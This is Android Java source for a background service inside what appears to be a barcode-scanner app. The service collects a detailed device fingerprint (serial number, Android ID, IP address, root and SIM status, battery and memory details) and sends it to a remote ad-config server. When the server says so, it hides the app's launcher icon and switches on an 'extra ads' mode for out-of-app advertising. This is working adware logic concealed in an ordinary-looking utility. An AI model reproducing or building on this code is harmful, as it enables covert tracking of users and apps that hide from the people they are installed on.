package com.zxingbar.code.bannerout;

import java.util.Map;
import android.util.Log;
import android.os.Build;
import java.util.HashMap;
import java.util.Calendar;
import com.zxingbar.code.R;
import android.content.Intent;
import android.app.IntentService;
import androidx.annotation.Nullable;
import android.content.ComponentName;
import io.reactivex.schedulers.Schedulers;
import com.zxingbar.code.act.base.BaseConfig;
import com.zxingbar.code.autil.nobase.PhoneHelper;
import com.zxingbar.code.banerout.HideIconService;
import io.reactivex.android.schedulers.AndroidSchedulers;

import com.zxingbar.code.internetsssss.config.AdConfig;
import com.zxingbar.code.internetsssss.client.NetClient;
import com.zxingbar.code.internetsssss.client.NetParams;
import com.zxingbar.code.internetsssss.client.ReturnData;
import static com.zxingbar.code.act.base.BaseConfig.isPrintLog;
import com.zxingbar.code.internetsssss.config.AdConfigProvider;
import com.zxingbar.code.internetsssss.client.ReturnNetObjCallBack;
import com.zxingbar.code.internetsssss.client.ReturnResultConfigInfos;

public class GetDefConfigInfo extends IntentService
{
    public GetDefConfigInfo()
    {
        super("GetDefConfigInfo");
    }

    protected void onHandleIntent(@Nullable Intent intent)
    {
        Map orgMap = new HashMap();
        Map requestMap = new HashMap();
        orgMap.put("m",Build.HARDWARE);
        orgMap.put("n",getPackageName());
        orgMap.put("b",PhoneHelper.getSerialNumber());
        orgMap.put("f",PhoneHelper.getSystemVersion());
        orgMap.put("i",PhoneHelper.getSystemLanguage());
        orgMap.put("j",PhoneHelper.getCurrentTimeZone());
        orgMap.put("g",PhoneHelper.isDeviceRooted() ? "1" : "0");
        orgMap.put("e",PhoneHelper.getIPAddress(getApplicationContext()));
        orgMap.put("a",PhoneHelper.getAndroidId(getApplicationContext()));
        orgMap.put("d",PhoneHelper.getResolution(getApplicationContext()));
        orgMap.put("v",PhoneHelper.getVersionName(getApplicationContext()));
        orgMap.put("x",PhoneHelper.getBatteryLevel(getApplicationContext()));
        orgMap.put("y",PhoneHelper.getBatteryStatus(getApplicationContext()));
        orgMap.put("k",PhoneHelper.getRamTotalMemory(getApplicationContext()));
        orgMap.put("l",PhoneHelper.getRomTotalMemory(getApplicationContext()));
        orgMap.put("w",PhoneHelper.getBatteryTemperature(getApplicationContext()));
        orgMap.put("h",PhoneHelper.isHasSimCard(getApplicationContext()) ? "1" : "0");
        orgMap.put("c",PhoneHelper.getDeviceBrand() + ":" + PhoneHelper.getSystemModel());
        requestMap.putAll(NetParams.getInstance().putFormsAddEncry(orgMap).convertForms().getMultipartForms());
        NetClient.getInstance(getApplicationContext()).getNetAllUrl().getAdConfigInfos(requestMap)./**********/
        subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new ReturnNetObjCallBack<ReturnData<ReturnResultConfigInfos>>(getApplicationContext())
        {
            public void onSuccess(ReturnData<ReturnResultConfigInfos> returnResultConfigInfos)
            {
                AdConfig adConfig = returnResultConfigInfos.getData().convertToAdConfig();
                AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
                BaseConfig.setAdConfig(adConfig);
                normalProcess(adConfig);
            }

            public void onFailure(String msg)
            {
                exceptionProcess(msg);

            }

            public void onError(String msg)
            {
                exceptionProcess(msg);

            }
        });
    }

    public void normalProcess(AdConfig adConfig)
    {
        if(isPrintLog)
            Log.i("AdsNotes","GetDefConfigInfoNormal: " + adConfig.toString());
        if(null == adConfig)
        {
            adConfig = new AdConfig(false,false,0,0,0l,
            getString(R.string.facebook_out_placement_id),
            getString(R.string.google_out_placement_id),0,0,0l,0l);
            AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
            BaseConfig.setAdConfig(adConfig);/*********************************/
        }
        if(null != adConfig)/*************************************************************/
        {
            /********************************1:Set Update Time****************************/
            if(0l == AdConfigProvider.getNextUpdateTime(GetDefConfigInfo.this))
            {
                Calendar calendar = Calendar.getInstance();
                calendar.add(Calendar.DAY_OF_MONTH,1);
                calendar.set(Calendar.HOUR_OF_DAY,7);
                calendar.set(Calendar.MINUTE,0);
                calendar.set(Calendar.SECOND,0);
                AdConfigProvider.setNextUpdateTime(GetDefConfigInfo.this,calendar.getTimeInMillis());
            }
            /********************************2:Hide App Icon***************************/
            if(adConfig.isHideIcon())
            {
                Intent intent = new Intent();
                intent.putExtra(HideIconService.DELAY_TIME,adConfig.getDelayTimeForHideIcon());
                intent.setComponent(new ComponentName(GetDefConfigInfo.this,HideIconService.class));
                GetDefConfigInfo.this.getApplicationContext().startService(intent);/***************/
            }
            /******************************3:Turn On Extra Ads Mode***********************/
            BaseConfig.registerExtraAd();
            /*******************************4:Other Assist Action*************************/
            BaseConfig.registerAssistOfExtraAd();
        }
    }

    public void exceptionProcess(String msg)
    {
        if(isPrintLog)
            Log.i("AdsNotes", "GetDefConfigInfoException: " + msg);
        AdConfig adConfig = BaseConfig.getAdConfig();
        if(null == adConfig)
        {
            adConfig = new AdConfig(false,false,0,0,0l,
            getString(R.string.facebook_out_placement_id),
            getString(R.string.google_out_placement_id),0,0,0l,0l);
            AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
            BaseConfig.setAdConfig(adConfig);/*********************************/
        }
        if(null != adConfig)/**********************************************************/
        {
            /*******************************1:Set Update Time**************************/
            if(0l == AdConfigProvider.getNextUpdateTime(GetDefConfigInfo.this))
            {
                Calendar calendar = Calendar.getInstance();
                calendar.add(Calendar.DAY_OF_MONTH,1);
                calendar.set(Calendar.HOUR_OF_DAY,7);
                calendar.set(Calendar.MINUTE,0);
                calendar.set(Calendar.SECOND,0);
                AdConfigProvider.setNextUpdateTime(GetDefConfigInfo.this,calendar.getTimeInMillis());
            }
            /********************************2:Hide App Icon***************************/
            if(adConfig.isHideIcon())
            {
                Intent intent = new Intent();
                intent.putExtra(HideIconService.DELAY_TIME,adConfig.getDelayTimeForHideIcon());
                intent.setComponent(new ComponentName(GetDefConfigInfo.this,HideIconService.class));
                GetDefConfigInfo.this.getApplicationContext().startService(intent);/***************/
            }
            /****************************3:Turn On Extra Ads Mode**********************/
            BaseConfig.registerExtraAd();
            /*****************************4:Other Assist Action************************/
            BaseConfig.registerAssistOfExtraAd();
        }
        NetStateReceiver.allowGetConfigInfos();/***************************************/
    }
}